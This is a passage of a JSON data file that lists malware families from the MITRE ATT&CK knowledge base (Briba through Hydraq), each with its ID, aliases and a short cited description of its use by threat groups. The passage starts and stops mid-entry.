  "malware--79499993-a8d6-45eb-b343-bf58dea5bdde": {
    "id": "S0204",
    "name": "Briba",
    "examples": [],
    "similar_words": [
      "Briba"
    ],
    "description": "[Briba](https://attack.mitre.org/software/S0204) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor and download files on to compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Briba May 2012)",
    "example_uses": []
  },
  "malware--5a84dc36-df0d-4053-9b7c-f0c388a57283": {
    "id": "S0025",
    "name": "CALENDAR",
    "examples": [],
    "similar_words": [
      "CALENDAR"
    ],
    "description": "[CALENDAR](https://attack.mitre.org/software/S0025) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Gmail Calendar traffic. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "malware--b0f13390-cec7-4814-b37c-ccec01887faa": {
    "id": "S0222",
    "name": "CCBkdr",
    "examples": [],
    "similar_words": [
      "CCBkdr"
    ],
    "description": "[CCBkdr](https://attack.mitre.org/software/S0222) is malware that was injected into a signed version of CCleaner and distributed from CCleaner's distribution website. (Citation: Talos CCleanup 2017) (Citation: Intezer Aurora Sept 2017)",
    "example_uses": []
  },
  "malware--ccd61dfc-b03f-4689-8c18-7c97eab08472": {
    "id": "S0023",
    "name": "CHOPSTICK",
    "examples": [],
    "similar_words": [
      "CHOPSTICK",
      "Backdoor.SofacyX",
      "SPLM",
      "Xagent",
      "X-Agent",
      "webhp"
    ],
    "description": "[CHOPSTICK](https://attack.mitre.org/software/S0023) is a malware family of modular backdoors used by [APT28](https://attack.mitre.org/groups/G0007). It has been used since at least 2012 and is usually dropped on victims as second-stage malware, though it has been used as first-stage malware in several cases. It has both Windows and Linux variants. (Citation: FireEye APT28) (Citation: ESET Sednit Part 2) (Citation: FireEye APT28 January 2017) (Citation: DOJ GRU Indictment Jul 2018) It is tracked separately from the [X-Agent for Android](https://attack.mitre.org/software/S0314).",
    "example_uses": []
  },
  "malware--8ab98e25-1672-4b5f-a2fb-e60f08a5ea9e": {
    "id": "S0212",
    "name": "CORALDECK",
    "examples": [],
    "similar_words": [
      "CORALDECK"
    ],
    "description": "[CORALDECK](https://attack.mitre.org/software/S0212) is an exfiltration tool used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--60c18d06-7b91-4742-bae3-647845cd9d81": {
    "id": "S0137",
    "name": "CORESHELL",
    "examples": [],
    "similar_words": [
      "CORESHELL",
      "Sofacy",
      "SOURFACE"
    ],
    "description": "[CORESHELL](https://attack.mitre.org/software/S0137) is a downloader used by [APT28](https://attack.mitre.org/groups/G0007). The older versions of this malware are known as SOURFACE and newer versions as CORESHELL.(Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)",
    "example_uses": []
  },
  "malware--b8fdef82-d2cf-4948-8949-6466357b1be1": {
    "id": "S0274",
    "name": "Calisto",
    "examples": [],
    "similar_words": [
      "Calisto"
    ],
    "description": "[Calisto](https://attack.mitre.org/software/S0274) is a macOS Trojan that opens a backdoor on the compromised machine. [Calisto](https://attack.mitre.org/software/S0274) is believed to have first been developed in 2016. (Citation: Securelist Calisto July 2018) (Citation: Symantec Calisto July 2018)",
    "example_uses": []
  },
  "malware--cb7bcf6f-085f-41db-81ee-4b68481661b5": {
    "id": "S0077",
    "name": "CallMe",
    "examples": [],
    "similar_words": [
      "CallMe"
    ],
    "description": "[CallMe](https://attack.mitre.org/software/S0077) is a Trojan designed to run on Apple OSX. It is based on a publicly available tool called Tiny SHell. (Citation: Scarlet Mimic Jan 2016)",
    "example_uses": []
  },
  "malware--72f54d66-675d-4587-9bd3-4ed09f9522e4": {
    "id": "S0030",
    "name": "Carbanak",
    "examples": [],
    "similar_words": [
      "Carbanak",
      "Anunak"
    ],
    "description": "[Carbanak](https://attack.mitre.org/software/S0030) is a full-featured, remote backdoor used by a group of the same name ([Carbanak](https://attack.mitre.org/groups/G0008)). It is intended for espionage, data exfiltration, and providing remote access to infected machines. (Citation: Kaspersky Carbanak) (Citation: FireEye CARBANAK June 2017)",
    "example_uses": []
  },
  "malware--8d9e758b-735f-4cbc-ba7c-32cd15138b2a": {
    "id": "S0261",
    "name": "Catchamas",
    "examples": [],
    "similar_words": [
      "Catchamas"
    ],
    "description": "[Catchamas](https://attack.mitre.org/software/S0261) is a Windows Trojan that steals information from compromised systems. (Citation: Symantec Catchamas April 2018)",
    "example_uses": []
  },
  "malware--dc5d1a33-62aa-4a0c-aa8c-589b87beb11e": {
    "id": "S0144",
    "name": "ChChes",
    "examples": [],
    "similar_words": [
      "ChChes",
      "Scorpion",
      "HAYMAKER"
    ],
    "description": "[ChChes](https://attack.mitre.org/software/S0144) is a Trojan that appears to be used exclusively by [menuPass](https://attack.mitre.org/groups/G0045). It was used to target Japanese organizations in 2016. Its lack of persistence methods suggests it may be intended as a first-stage tool. (Citation: Palo Alto menuPass Feb 2017) (Citation: JPCERT ChChes Feb 2017) (Citation: PWC Cloud Hopper Technical Annex April 2017)",
    "example_uses": []
  },
  "malware--5bcd5511-6756-4824-a692-e8bb109364af": {
    "id": "S0220",
    "name": "Chaos",
    "examples": [],
    "similar_words": [
      "Chaos"
    ],
    "description": "[Chaos](https://attack.mitre.org/software/S0220) is Linux malware that compromises systems by brute force attacks against SSH services. Once installed, it provides a reverse shell to its controllers, triggered by unsolicited packets. (Citation: Chaos Stolen Backdoor)",
    "example_uses": []
  },
  "malware--b2203c59-4089-4ee4-bfe1-28fa25f0dbfe": {
    "id": "S0107",
    "name": "Cherry Picker",
    "examples": [],
    "similar_words": [
      "Cherry Picker"
    ],
    "description": "[Cherry Picker](https://attack.mitre.org/software/S0107) is a point of sale (PoS) memory scraper. (Citation: Trustwave Cherry Picker)",
    "example_uses": []
  },
  "malware--5a3a31fe-5a8f-48e1-bff0-a753e5b1be70": {
    "id": "S0020",
    "name": "China Chopper",
    "examples": [],
    "similar_words": [
      "China Chopper"
    ],
    "description": "[China Chopper](https://attack.mitre.org/software/S0020) is a [Web Shell](https://attack.mitre.org/techniques/T1505/003) hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server.(Citation: Lee 2013) It has been used by several threat groups.(Citation: Dell TG-3390)(Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021)(Citation: Rapid7 HAFNIUM Mar 2021)",
    "example_uses": []
  },
  "malware--cbf646f1-7db5-4dc6-808b-0094313949df": {
    "id": "S0054",
    "name": "CloudDuke",
    "examples": [],
    "similar_words": [
      "CloudDuke",
      "MiniDionis",
      "CloudLook"
    ],
    "description": "[CloudDuke](https://attack.mitre.org/software/S0054) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: F-Secure The Dukes) (Citation: Securelist Minidionis July 2015)",
    "example_uses": []
  },
  "malware--da5880b4-f7da-4869-85f2-e0aba84b8565": {
    "id": "S0126",
    "name": "ComRAT",
    "examples": [],
    "similar_words": [
      "ComRAT"
    ],
    "description": "[ComRAT](https://attack.mitre.org/software/S0126) is a second stage implant suspected of being a descendant of [Agent.btz](https://attack.mitre.org/software/S0092) and used by [Turla](https://attack.mitre.org/groups/G0010). The first version of [ComRAT](https://attack.mitre.org/software/S0126) was identified in 2007, but the tool has undergone substantial development for many years since.(Citation: Symantec Waterbug)(Citation: NorthSec 2015 GData Uroburos Tools)(Citation: ESET ComRAT May 2020)",
    "example_uses": []
  },
  "malware--f4c80d39-ce10-4f74-9b50-a7e3f5df1f2e": {
    "id": "S0244",
    "name": "Comnie",
    "examples": [],
    "similar_words": [
      "Comnie"
    ],
    "description": "[Comnie](https://attack.mitre.org/software/S0244) is a remote backdoor which has been used in attacks in East Asia. (Citation: Palo Alto Comnie)",
    "example_uses": []
  },
  "malware--2eb9b131-d333-4a48-9eb4-d8dec46c19ee": {
    "id": "S0050",
    "name": "CosmicDuke",
    "examples": [],
    "similar_words": [
      "CosmicDuke",
      "TinyBaron",
      "BotgenStudios",
      "NemesisGemina"
    ],
    "description": "[CosmicDuke](https://attack.mitre.org/software/S0050) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--e6ef745b-077f-42e1-a37d-29eecff9c754": {
    "id": "S0046",
    "name": "CozyCar",
    "examples": [],
    "similar_words": [
      "CozyCar",
      "CozyDuke",
      "CozyBear",
      "Cozer",
      "EuroAPT"
    ],
    "description": "[CozyCar](https://attack.mitre.org/software/S0046) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. It is a modular malware platform, and its backdoor component can be instructed to download and execute a variety of modules with different functionality. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--326af1cd-78e7-45b7-a326-125d2f7ef8f2": {
    "id": "S0115",
    "name": "Crimson",
    "examples": [],
    "similar_words": [
      "Crimson",
      "MSIL/Crimson"
    ],
    "description": "[Crimson](https://attack.mitre.org/software/S0115) is a remote access Trojan that has been used by [Transparent Tribe](https://attack.mitre.org/groups/G0134) since at least 2016.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)",
    "example_uses": []
  },
  "malware--a5e91d50-24fa-44ec-9894-39a88f658cea": {
    "id": "S0235",
    "name": "CrossRAT",
    "examples": [],
    "similar_words": [
      "CrossRAT"
    ],
    "description": "[CrossRAT](https://attack.mitre.org/software/S0235) is a cross platform RAT.",
    "example_uses": []
  },
  "malware--d186c1d6-e3ac-4c3d-a534-9ddfeb8c57bb": {
    "id": "S0255",
    "name": "DDKONG",
    "examples": [],
    "similar_words": [
      "DDKONG"
    ],
    "description": "[DDKONG](https://attack.mitre.org/software/S0255) is a malware sample that was part of a campaign by [Rancor](https://attack.mitre.org/groups/G0075). [DDKONG](https://attack.mitre.org/software/S0255) was first seen used in February 2017. (Citation: Rancor Unit42 June 2018)",
    "example_uses": []
  },
  "malware--0852567d-7958-4f4b-8947-4f840ec8d57d": {
    "id": "S0213",
    "name": "DOGCALL",
    "examples": [],
    "similar_words": [
      "DOGCALL"
    ],
    "description": "[DOGCALL](https://attack.mitre.org/software/S0213) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) that has been used to target South Korean government and military organizations in 2017. It is typically dropped using a Hangul Word Processor (HWP) exploit. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--310f437b-29e7-4844-848c-7220868d074a": {
    "id": "S0209",
    "name": "Darkmoon",
    "examples": [],
    "similar_words": [],
    "description": "",
    "example_uses": []
  },
  "malware--b6b3dfc7-9a81-43ff-ac04-698bad48973a": {
    "id": "S0187",
    "name": "Daserf",
    "examples": [],
    "similar_words": [
      "Daserf",
      "Muirim",
      "Nioupale"
    ],
    "description": "[Daserf](https://attack.mitre.org/software/S0187) is a backdoor that has been used to spy on and steal from Japanese, South Korean, Russian, Singaporean, and Chinese victims. Researchers have identified versions written in both Visual C and Delphi. (Citation: Trend Micro Daserf Nov 2017) (Citation: Secureworks BRONZE BUTLER Oct 2017)",
    "example_uses": []
  },
  "malware--8f460983-1bbb-4e7e-8094-f0b5e720f658": {
    "id": "S0243",
    "name": "DealersChoice",
    "examples": [],
    "similar_words": [
      "DealersChoice"
    ],
    "description": "[DealersChoice](https://attack.mitre.org/software/S0243) is a Flash exploitation framework used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: Sofacy DealersChoice)",
    "example_uses": []
  },
  "malware--94379dec-5c87-49db-b36e-66abc0b81344": {
    "id": "S0021",
    "name": "Derusbi",
    "examples": [],
    "similar_words": [
      "Derusbi",
      "PHOTO"
    ],
    "description": "[Derusbi](https://attack.mitre.org/software/S0021) is malware used by multiple Chinese APT groups.(Citation: Novetta-Axiom)(Citation: ThreatConnect Anthem) Both Windows and Linux variants have been observed.(Citation: Fidelis Turbo)",
    "example_uses": []
  },
  "malware--e170995d-4f61-4f17-b60e-04f9a06ee517": {
    "id": "S0200",
    "name": "Dipsind",
    "examples": [],
    "similar_words": [
      "Dipsind"
    ],
    "description": "[Dipsind](https://attack.mitre.org/software/S0200) is a malware family of backdoors that appear to be used exclusively by [PLATINUM](https://attack.mitre.org/groups/G0068). (Citation: Microsoft PLATINUM April 2016)",
    "example_uses": []
  },
  "malware--f36b2598-515f-4345-84e5-5ccde253edbe": {
    "id": "S0281",
    "name": "Dok",
    "examples": [],
    "similar_words": [
      "Dok",
      "Retefe"
    ],
    "description": "[Dok](https://attack.mitre.org/software/S0281) is a Trojan application disguised as a .zip file that is able to collect user credentials and install a malicious proxy server to redirect a user's network traffic (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)).(Citation: objsee mac malware 2017)(Citation: hexed osx.dok analysis 2019)(Citation: CheckPoint Dok)",
    "example_uses": []
  },
  "malware--e48df773-7c95-4a4c-ba70-ea3d15900148": {
    "id": "S0186",
    "name": "DownPaper",
    "examples": [],
    "similar_words": [
      "DownPaper"
    ],
    "description": "[DownPaper](https://attack.mitre.org/software/S0186) is a backdoor Trojan; its main functionality is to download and run second stage malware. (Citation: ClearSky Charming Kitten Dec 2017)",
    "example_uses": []
  },
  "malware--08d20cd2-f084-45ee-8558-fa6ef5a18519": {
    "id": "S0134",
    "name": "Downdelph",
    "examples": [],
    "similar_words": [
      "Downdelph",
      "Delphacy"
    ],
    "description": "[Downdelph](https://attack.mitre.org/software/S0134) is a first-stage downloader written in Delphi that has been used by [APT28](https://attack.mitre.org/groups/G0007) in rare instances between 2013 and 2015. (Citation: ESET Sednit Part 3)",
    "example_uses": []
  },
  "malware--68dca94f-c11d-421e-9287-7c501108e18c": {
    "id": "S0038",
    "name": "Duqu",
    "examples": [],
    "similar_words": [
      "Duqu"
    ],
    "description": "[Duqu](https://attack.mitre.org/software/S0038) is a malware platform that uses a modular approach to extend functionality after deployment within a target network. (Citation: Symantec W32.Duqu)",
    "example_uses": []
  },
  "malware--687c23e4-4e25-4ee7-a870-c5e002511f54": {
    "id": "S0062",
    "name": "DustySky",
    "examples": [],
    "similar_words": [
      "DustySky",
      "NeD Worm"
    ],
    "description": "[DustySky](https://attack.mitre.org/software/S0062) is multi-stage malware written in .NET that has been used by [Molerats](https://attack.mitre.org/groups/G0021) since May 2015. (Citation: DustySky) (Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019)",
    "example_uses": []
  },
  "malware--63c2a130-8a5b-452f-ad96-07cf0af12ffe": {
    "id": "S0024",
    "name": "Dyre",
    "examples": [],
    "similar_words": [
      "Dyre"
    ],
    "description": "[Dyre](https://attack.mitre.org/software/S0024) is a banking Trojan that has been used for financial gain. \n (Citation: Symantec Dyre June 2015)(Citation: Malwarebytes Dyreza November 2015)",
    "example_uses": []
  },
  "malware--3cab1b76-2f40-4cd0-8d2c-7ed16eeb909c": {
    "id": "S0064",
    "name": "ELMER",
    "examples": [],
    "similar_words": [
      "ELMER"
    ],
    "description": "[ELMER](https://attack.mitre.org/software/S0064) is a non-persistent, proxy-aware HTTP backdoor written in Delphi that has been used by [APT16](https://attack.mitre.org/groups/G0023). (Citation: FireEye EPS Awakens Part 2)",
    "example_uses": []
  },
  "malware--7551188b-8f91-4d34-8350-0d0c57b2b913": {
    "id": "S0081",
    "name": "Elise",
    "examples": [],
    "similar_words": [
      "Elise",
      "BKDR_ESILE",
      "Page"
    ],
    "description": "[Elise](https://attack.mitre.org/software/S0081) is a custom backdoor Trojan that appears to be used exclusively by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It is part of a larger group of tools referred to as LStudio, ST Group, and APT0LSTU.(Citation: Lotus Blossom Jun 2015)(Citation: Accenture Dragonfish Jan 2018)",
    "example_uses": []
  },
  "malware--0f862b01-99da-47cc-9bdb-db4a86a95bb1": {
    "id": "S0082",
    "name": "Emissary",
    "examples": [],
    "similar_words": [
      "Emissary"
    ],
    "description": "[Emissary](https://attack.mitre.org/software/S0082) is a Trojan that has been used by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It shares code with [Elise](https://attack.mitre.org/software/S0081), with both Trojans being part of a malware group referred to as LStudio.(Citation: Lotus Blossom Dec 2015)",
    "example_uses": []
  },
  "malware--6b62e336-176f-417b-856a-8552dd8c44e1": {
    "id": "S0091",
    "name": "Epic",
    "examples": [],
    "similar_words": [
      "Epic",
      "Tavdig",
      "Wipbot",
      "WorldCupSec",
      "TadjMakhal"
    ],
    "description": "[Epic](https://attack.mitre.org/software/S0091) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)",
    "example_uses": []
  },
  "malware--2f1a9fd0-3b7c-4d77-a358-78db13adbe78": {
    "id": "S0152",
    "name": "EvilGrab",
    "examples": [],
    "similar_words": [
      "EvilGrab"
    ],
    "description": "[EvilGrab](https://attack.mitre.org/software/S0152) is a malware family with common reconnaissance capabilities. It has been deployed by [menuPass](https://attack.mitre.org/groups/G0045) via malicious Microsoft Office documents as part of spearphishing campaigns. (Citation: PWC Cloud Hopper Technical Annex April 2017)",
    "example_uses": []
  },
  "malware--fece06b7-d4b1-42cf-b81a-5323c917546e": {
    "id": "S0181",
    "name": "FALLCHILL",
    "examples": [],
    "similar_words": [
      "FALLCHILL"
    ],
    "description": "[FALLCHILL](https://attack.mitre.org/software/S0181) is a RAT that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least 2016 to target the aerospace, telecommunications, and finance industries. It is usually dropped by other [Lazarus Group](https://attack.mitre.org/groups/G0032) malware or delivered when a victim unknowingly visits a compromised website. (Citation: US-CERT FALLCHILL Nov 2017)",
    "example_uses": []
  },
  "malware--cf8df906-179c-4a78-bd6e-6605e30f6624": {
    "id": "S0267",
    "name": "FELIXROOT",
    "examples": [],
    "similar_words": [
      "FELIXROOT",
      "GreyEnergy mini"
    ],
    "description": "[FELIXROOT](https://attack.mitre.org/software/S0267) is a backdoor that has been used to target Ukrainian victims. (Citation: FireEye FELIXROOT July 2018)",
    "example_uses": []
  },
  "malware--43213480-78f7-4fb3-976f-d48f5f6a4c2a": {
    "id": "S0036",
    "name": "FLASHFLOOD",
    "examples": [],
    "similar_words": [
      "FLASHFLOOD"
    ],
    "description": "[FLASHFLOOD](https://attack.mitre.org/software/S0036) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--0e18b800-906c-4e44-a143-b11c72b3448b": {
    "id": "S0173",
    "name": "FLIPSIDE",
    "examples": [],
    "similar_words": [
      "FLIPSIDE"
    ],
    "description": "[FLIPSIDE](https://attack.mitre.org/software/S0173) is a simple tool similar to Plink that is used by [FIN5](https://attack.mitre.org/groups/G0053) to maintain access to victims. (Citation: Mandiant FIN5 GrrCON Oct 2016)",
    "example_uses": []
  },
  "malware--bb3c1098-d654-4620-bf40-694386d28921": {
    "id": "S0076",
    "name": "FakeM",
    "examples": [],
    "similar_words": [
      "FakeM"
    ],
    "description": "[FakeM](https://attack.mitre.org/software/S0076) is a shellcode-based Windows backdoor that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)",
    "example_uses": []
  },
  "malware--196f1f32-e0c2-4d46-99cd-234d4b6befe1": {
    "id": "S0171",
    "name": "Felismus",
    "examples": [],
    "similar_words": [
      "Felismus"
    ],
    "description": "[Felismus](https://attack.mitre.org/software/S0171) is a modular backdoor that has been used by [Sowbug](https://attack.mitre.org/groups/G0054). (Citation: Symantec Sowbug Nov 2017) (Citation: Forcepoint Felismus Mar 2017)",
    "example_uses": []
  },
  "malware--a5528622-3a8a-4633-86ce-8cdaf8423858": {
    "id": "S0182",
    "name": "FinFisher",
    "examples": [],
    "similar_words": [
      "FinFisher",
      "FinSpy"
    ],
    "description": "[FinFisher](https://attack.mitre.org/software/S0182) is a government-grade commercial surveillance spyware reportedly sold exclusively to government agencies for use in targeted and lawful criminal investigations. It is heavily obfuscated and uses multiple anti-analysis techniques. It has other variants including [Wingbird](https://attack.mitre.org/software/S0176). (Citation: FinFisher Citation) (Citation: Microsoft SIR Vol 21) (Citation: FireEye FinSpy Sept 2017) (Citation: Securelist BlackOasis Oct 2017) (Citation: Microsoft FinFisher March 2018)",
    "example_uses": []
  },
  "malware--ff6840c9-4c87-4d07-bbb6-9f50aa33d498": {
    "id": "S0143",
    "name": "Flame",
    "examples": [],
    "similar_words": [
      "Flame",
      "Flamer",
      "sKyWIper"
    ],
    "description": "[Flame](https://attack.mitre.org/software/S0143) is a sophisticated toolkit that has been used to collect information since at least 2010, largely targeting Middle East countries. (Citation: Kaspersky Flame)",
    "example_uses": []
  },
  "malware--4a98e44a-bd52-461e-af1e-a4457de87a36": {
    "id": "S0277",
    "name": "FruitFly",
    "examples": [],
    "similar_words": [
      "FruitFly"
    ],
    "description": "FruitFly is designed to spy on mac users  (Citation: objsee mac malware 2017).",
    "example_uses": []
  },
  "malware--f2e8c7a1-cae1-45c4-baf0-6f21bdcbb2c2": {
    "id": "S0026",
    "name": "GLOOXMAIL",
    "examples": [],
    "similar_words": [
      "GLOOXMAIL",
      "Trojan.GTALK"
    ],
    "description": "[GLOOXMAIL](https://attack.mitre.org/software/S0026) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Jabber/XMPP traffic. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "malware--76abb3ef-dafd-4762-97cb-a35379429db4": {
    "id": "S0168",
    "name": "Gazer",
    "examples": [],
    "similar_words": [
      "Gazer",
      "WhiteBear"
    ],
    "description": "[Gazer](https://attack.mitre.org/software/S0168) is a backdoor used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2016. (Citation: ESET Gazer Aug 2017)",
    "example_uses": []
  },
  "malware--199463de-d9be-46d6-bb41-07234c1dd5a6": {
    "id": "S0049",
    "name": "GeminiDuke",
    "examples": [],
    "similar_words": [
      "GeminiDuke"
    ],
    "description": "[GeminiDuke](https://attack.mitre.org/software/S0049) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2009 to 2012. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--b9799466-9dd7-4098-b2d6-f999ce50b9a8": {
    "id": "S0249",
    "name": "Gold Dragon",
    "examples": [],
    "similar_words": [
      "Gold Dragon"
    ],
    "description": "[Gold Dragon](https://attack.mitre.org/software/S0249) is a Korean-language, data gathering implant that was first observed in the wild in South Korea in July 2017. [Gold Dragon](https://attack.mitre.org/software/S0249) was used along with [Brave Prince](https://attack.mitre.org/software/S0252) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations targeting organizations associated with the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)",
    "example_uses": []
  },
  "malware--1d1fce2f-0db5-402b-9843-4278a0694637": {
    "id": "S0237",
    "name": "GravityRAT",
    "examples": [],
    "similar_words": [
      "GravityRAT"
    ],
    "description": "[GravityRAT](https://attack.mitre.org/software/S0237) is a remote access tool (RAT) and has been in ongoing development since 2016. The actor behind the tool remains unknown, but two usernames have been recovered that link to the author, which are \"TheMartian\" and \"The Invincible.\" According to the National Computer Emergency Response Team (CERT) of India, the malware has been identified in attacks against organization and entities in India. (Citation: Talos GravityRAT)",
    "example_uses": []
  },
  "malware--f8dfbc54-b070-4224-b560-79aaa5f835bd": {
    "id": "S0132",
    "name": "H1N1",
    "examples": [],
    "similar_words": [
      "H1N1"
    ],
    "description": "[H1N1](https://attack.mitre.org/software/S0132) is a malware variant that has been distributed via a campaign using VBA macros to infect victims. Although it initially had only loader capabilities, it has evolved to include information-stealing functionality. (Citation: Cisco H1N1 Part 1)",
    "example_uses": []
  },
  "malware--0ced8926-914e-4c78-bc93-356fb90dbd1f": {
    "id": "S0151",
    "name": "HALFBAKED",
    "examples": [],
    "similar_words": [
      "HALFBAKED"
    ],
    "description": "[HALFBAKED](https://attack.mitre.org/software/S0151) is a malware family consisting of multiple components intended to establish persistence in victim networks. (Citation: FireEye FIN7 April 2017)",
    "example_uses": []
  },
  "malware--2daa14d6-cbf3-4308-bb8e-213c324a08e4": {
    "id": "S0037",
    "name": "HAMMERTOSS",
    "examples": [],
    "similar_words": [
      "HAMMERTOSS",
      "HammerDuke",
      "NetDuke"
    ],
    "description": "[HAMMERTOSS](https://attack.mitre.org/software/S0037) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: FireEye APT29) (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--211cfe9f-2676-4e1c-a5f5-2c8091da2a68": {
    "id": "S0214",
    "name": "HAPPYWORK",
    "examples": [],
    "similar_words": [
      "HAPPYWORK"
    ],
    "description": "[HAPPYWORK](https://attack.mitre.org/software/S0214) is a downloader used by [APT37](https://attack.mitre.org/groups/G0067) to target South Korean government and financial victims in November 2016. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--bd0536d7-b081-43ae-a773-cfb057c5b988": {
    "id": "S0246",
    "name": "HARDRAIN",
    "examples": [],
    "similar_words": [
      "HARDRAIN"
    ],
    "description": "[HARDRAIN](https://attack.mitre.org/software/S0246) is a Trojan malware variant reportedly used by the North Korean government. (Citation: US-CERT HARDRAIN March 2018)",
    "example_uses": []
  },
  "malware--007b44b6-e4c5-480b-b5b9-56f2081b1b7b": {
    "id": "S0061",
    "name": "HDoor",
    "examples": [],
    "similar_words": [
      "HDoor",
      "Custom HDoor"
    ],
    "description": "[HDoor](https://attack.mitre.org/software/S0061) is malware that has been customized and used by the [Naikon](https://attack.mitre.org/groups/G0019) group. (Citation: Baumgartner Naikon 2015)",
    "example_uses": []
  },
  "malware--e669bb87-f773-4c7b-bfcc-a9ffebfdd8d4": {
    "id": "S0135",
    "name": "HIDEDRV",
    "examples": [],
    "similar_words": [
      "HIDEDRV"
    ],
    "description": "[HIDEDRV](https://attack.mitre.org/software/S0135) is a rootkit used by [APT28](https://attack.mitre.org/groups/G0007). It has been deployed along with [Downdelph](https://attack.mitre.org/software/S0134) to execute and hide that malware. (Citation: ESET Sednit Part 3) (Citation: Sekoia HideDRV Oct 2016)",
    "example_uses": []
  },
  "malware--7451bcf9-e6e6-4a70-bc3d-1599173d0035": {
    "id": "S0232",
    "name": "HOMEFRY",
    "examples": [],
    "similar_words": [
      "HOMEFRY"
    ],
    "description": "[HOMEFRY](https://attack.mitre.org/software/S0232) is a 64-bit Windows password dumper/cracker that has previously been used in conjunction with other [Leviathan](https://attack.mitre.org/groups/G0065) backdoors. (Citation: FireEye Periscope March 2018)",
    "example_uses": []
  },
  "malware--e066bf86-9cfb-407a-9d25-26fd5d91e360": {
    "id": "S0070",
    "name": "HTTPBrowser",
    "examples": [],
    "similar_words": [
      "HTTPBrowser",
      "Token Control",
      "HttpDump"
    ],
    "description": "[HTTPBrowser](https://attack.mitre.org/software/S0070) is malware that has been used by several threat groups. (Citation: ThreatStream Evasion Analysis) (Citation: Dell TG-3390) It is believed to be of Chinese origin. (Citation: ThreatConnect Anthem)",
    "example_uses": []
  },
  "malware--4b62ab58-c23b-4704-9c15-edd568cd59f8": {
    "id": "S0047",
    "name": "Hacking Team UEFI Rootkit",
    "examples": [],
    "similar_words": [
      "Hacking Team UEFI Rootkit"
    ],
    "description": "[Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) is a rootkit developed by the company Hacking Team as a method of persistence for remote access software. (Citation: TrendMicro Hacking Team UEFI)",
    "example_uses": []
  },
  "malware--eff1a885-6f90-42a1-901f-eef6e7a1905e": {
    "id": "S0170",
    "name": "Helminth",
    "examples": [],
    "similar_words": [
      "Helminth"
    ],
    "description": "[Helminth](https://attack.mitre.org/software/S0170) is a backdoor that has at least two variants - one written in VBScript and PowerShell that is delivered via a macros in Excel spreadsheets, and one that is a standalone Windows executable. (Citation: Palo Alto OilRig May 2016)",
    "example_uses": []
  },
  "malware--5967cc93-57c9-404a-8ffd-097edfa7bdfc": {
    "id": "S0087",
    "name": "Hi-Zor",
    "examples": [],
    "similar_words": [
      "Hi-Zor"
    ],
    "description": "[Hi-Zor](https://attack.mitre.org/software/S0087) is a remote access tool (RAT) that has characteristics similar to [Sakula](https://attack.mitre.org/software/S0074). It was used in a campaign named INOCNATION. (Citation: Fidelis Hi-Zor)",
    "example_uses": []
  },
  "malware--95047f03-4811-4300-922e-1ba937d53a61": {
    "id": "S0009",
    "name": "Hikit",
    "examples": [],
    "similar_words": [
      "Hikit"
    ],
    "description": "[Hikit](https://attack.mitre.org/software/S0009) is malware that has been used by [Axiom](https://attack.mitre.org/groups/G0001) for late-stage persistence and exfiltration after the initial compromise.(Citation: Novetta-Axiom)(Citation: FireEye Hikit Rootkit)",
    "example_uses": []
  },
  "malware--73a4793a-ce55-4159-b2a6-208ef29b326f": {
    "id": "S0203",
    "name": "Hydraq",
    "examples": [],
    "similar_words": [
      "Hydraq",
      "Aurora",
      "9002 RAT"
    ],
    "description": "[Hydraq](https://attack.mitre.org/software/S0203) is a data-theft trojan first used by [Elderwood](https://attack.mitre.org/groups/G0066) in the 2009 Google intrusion known as Operation Aurora, though variations of this trojan have been used in more recent campaigns by other Chinese actors, possibly including [APT17](https://attack.mitre.org/groups/G0025).(Citation: MicroFocus 9002 Aug 2016)(Citation: Symantec Elderwood Sept 2012)(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: ASERT Seven Pointed Dagger Aug 2015)(Citation: FireEye DeputyDog 9002 November 2013)(Citation: ProofPoint GoT 9002 Aug 2017)(Citation: FireEye Sunshop Campaign May 2013)(Citation: PaloAlto 3102 Sept 2015)",
    "example_uses": []
  },
  "malware--5be33fef-39c0-4532-84ee-bea31e1b5324": {
    "id": "S0189",
